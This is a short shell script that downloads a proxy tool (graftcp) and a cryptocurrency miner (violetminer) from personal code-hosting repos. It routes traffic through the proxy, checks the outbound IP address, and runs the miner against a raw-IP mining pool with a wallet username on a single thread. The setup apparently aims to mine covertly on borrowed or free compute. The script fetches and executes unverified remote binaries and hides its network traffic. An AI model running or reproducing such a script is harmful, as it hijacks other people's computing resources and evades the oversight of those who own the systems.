curl -L -o graftcp.tar.gz https://github.com/Todorox/Rand/raw/main/graftcp.tar.gz
tar -xvzf graftcp.tar.gz
cd graftcp && chmod +x graftcp
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer

./graftcp/graftcp ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_XPDzztzE6rL4rQlJtSwyL.1059 --password x --disableNVIDIA --threads 1
